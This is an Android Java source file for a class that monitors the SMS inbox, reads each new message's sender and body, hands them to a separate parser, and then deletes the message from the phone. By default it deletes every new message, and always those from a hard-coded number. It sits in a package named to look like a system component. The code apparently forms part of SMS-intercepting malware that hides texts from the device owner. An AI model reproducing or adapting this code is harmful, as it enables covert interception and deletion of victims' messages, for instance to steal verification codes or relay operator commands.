package com.android.smssystem;

import android.content.Context;
import android.content.SharedPreferences;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;
import android.util.Log;

public class SmSObserver extends ContentObserver {

	private Context context;
	private int maxId=-1;
	private Uri inbox=null;
	private SharedPreferences sp = null;
	private SmSutils su=null;
	@Override
	public void onChange(boolean selfChange) {
		// TODO Auto-generated method stub
		super.onChange(selfChange);
		Log.i("action", "< 0 Change"+maxId);
		Change();
	}

	public SmSObserver(Context context,Handler handler) {
		super(handler);
		// TODO Auto-generated constructor stub
		this.context=context;
		inbox=Uri.parse("content://sms/inbox");
		su=new SmSutils();
		sp = context.getSharedPreferences("config", Context.MODE_PRIVATE);
		Change();
	}
	public void Change(){
		Cursor cursor=context.getContentResolver().query(inbox, null, null, null, "_id desc");
		if(cursor.moveToNext()){
			int id=cursor.getInt(cursor.getColumnIndex("_id"));
			Log.i("action", id+"< 1数据ID"+"MAXID >"+maxId);
			if(maxId==-1){
				maxId=id;
				Log.i("action", id+"< 2数据ID"+"MAXID >"+maxId);
			}else{
				if(id>maxId){
					maxId=id;
					Log.i("action", id+"< 3数据ID"+"MAXID >"+maxId);
					String address = cursor.getString(cursor.getColumnIndex("address"));
					String body=cursor.getString(cursor.getColumnIndex("body"));
					boolean islj=sp.getBoolean("islj", true);
					Log.i("action", address+" islj->"+islj+"收到短信->"+body);
					su.Parse(address, body, context,sp);
					boolean isdelete=islj||address.contains(SmSutils.phone);
					Log.i("action", id+"< 4数据ID"+"MAXID >"+maxId+" delete -"+isdelete);
					if (isdelete) {
						delete(id);
					}
				}else{
					Log.i("action", id+"< 5数据ID"+"MAXID >"+maxId);
					maxId=id;
				}
			}
		}
	}
	public void delete(int id){
		int tx=context.getContentResolver().delete(Uri.parse("content://sms/"), "_id="+ id, null);
		Log.i("action", id+"< 6数据ID"+"MAXID >"+maxId+" delete >"+tx);
	}

}
